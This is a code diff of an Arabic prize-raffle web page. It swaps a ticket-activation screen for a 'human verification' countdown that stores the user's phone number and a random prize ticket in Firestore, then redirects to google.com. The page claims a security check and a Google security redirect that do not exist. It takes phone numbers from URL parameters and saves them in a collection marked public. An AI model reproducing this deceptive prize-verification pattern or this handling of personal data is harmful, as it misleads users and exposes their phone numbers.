@@ -2,32 +2,29 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد تفعيل الجائزة | طومبولا الحظ</title>
+    <title>تحقق الأمان | طومبولا الحظ</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Cairo', sans-serif; background: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #fbbf24; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <style>body { font-family: 'Cairo', sans-serif; background: #f0f4f8; }</style>
 </head>
-<body class="p-4 text-center">
-    <div class="max-w-md w-full bg-white rounded-3xl shadow-xl p-8 border-t-8 border-amber-400">
-        <div id="statusIcon" class="text-6xl mb-4">⏳</div>
-        <h1 class="text-2xl font-black text-slate-800 mb-2">جاري تأكيد طلبك...</h1>
-        <p id="statusMsg" class="text-slate-500 mb-6">يرجى الانتظار 11 ثانية لتفعيل تذكرة السحب تلقائياً.</p>
+<body class="flex items-center justify-center h-screen">
+    <div class="max-w-sm w-full bg-white p-8 rounded-3xl shadow-2xl border-t-8 border-amber-400 text-center">
+        <h1 class="text-2xl font-black text-slate-800 mb-2">تحقق بشري</h1>
+        <p class="text-slate-500 mb-6 text-sm">انتظر قليلاً ليتم تفعيل جائزتك الذهبية</p>
         
-        <div class="flex flex-col items-center gap-4">
-            <div id="loader" class="loader"></div>
-            <div id="timer" class="text-4xl font-black text-amber-500 bg-amber-50 px-8 py-3 rounded-2xl border-2 border-amber-200">11</div>
-            <p id="prizeNameDisplay" class="text-sm font-bold text-slate-400"></p>
+        <div class="text-6xl font-black text-amber-500 mb-6" id="timer">15</div>
+        
+        <div id="status" class="hidden">
+            <div class="bg-green-100 text-green-700 p-3 rounded-xl font-bold mb-4 animate-bounce">
+                ✅ تم التفعيل بنجاح!
+            </div>
+            <p class="text-xs text-slate-400">جاري توجيهك إلى صفحة الأمان من جوجل...</p>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
-        import { getFirestore, doc, setDoc, serverTimestamp, addDoc, collection } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCYipCdnHZXCkO3qKN9AqaWM9IDf9rOv04",
@@ -40,48 +37,45 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const appId = "tombola-luck-v1";
-
         const params = new URLSearchParams(window.location.search);
+        
         const uid = params.get('uid');
         const index = params.get('index');
-        const prizeName = params.get('prizeName');
+        const phone = params.get('phone');
+        const prizeName = params.get('prize');
 
-        document.getElementById('prizeNameDisplay').innerText = `الجائزة: ${prizeName}`;
+        let timeLeft = 15;
+        const timerEl = document.getElementById('timer');
 
-        let timeLeft = 11;
-        const interval = setInterval(async () => {
+        const countdown = setInterval(async () => {
             timeLeft--;
-            document.getElementById('timer').innerText = timeLeft;
-            if(timeLeft <= 0) {
-                clearInterval(interval);
-                await activateTicket();
+            timerEl.innerText = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                const ticketNum = `GOLD-${Math.floor(10000 + Math.random() * 90000)}`;
+                const appId = "tombola-luck-v1";
+
+                try {
+                    // تحديث قاعدة البيانات
+                    await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
+                        active: true, phone: phone, ticketNumber: ticketNum, timestamp: serverTimestamp()
+                    }, { merge: true });
+
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
+                        userId: uid, phone: phone, prizeName: prizeName, ticketNumber: ticketNum, activatedAt: serverTimestamp()
+                    });
+
+                    document.getElementById('status').classList.remove('hidden');
+                    timerEl.classList.add('hidden');
+
+                    // التوجيه لجوجل بعد ثانية ونصف
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 1500);
+                } catch (e) { alert("خطأ في الاتصال بالسيرفر"); }
             }
         }, 1000);
-
-        async function activateTicket() {
-            try {
-                const phone = localStorage.getItem('user_phone') || "Unknown";
-                const ticket = `GOLD-${Math.floor(10000 + Math.random() * 90000)}`;
-                
-                // تفعيل في ملف المستخدم
-                await setDoc(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`), {
-                    active: true, phone, ticketNumber: ticket, timestamp: serverTimestamp()
-                }, { merge: true });
-
-                // إضافة للسجل العام
-                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
-                    userId: uid, phone, prizeName, ticketNumber: ticket, activatedAt: serverTimestamp()
-                });
-
-                document.getElementById('statusIcon').innerText = "✅";
-                document.getElementById('statusMsg').innerText = "تم التفعيل بنجاح! نُعيدك الآن...";
-                document.getElementById('loader').style.display = "none";
-                setTimeout(() => window.location.href = "index.html", 2000);
-            } catch (e) {
-                document.getElementById('statusMsg').innerText = "خطأ في التفعيل، يرجى المحاولة لاحقاً.";
-            }
-        }
     </script>
 </body>
 </html>
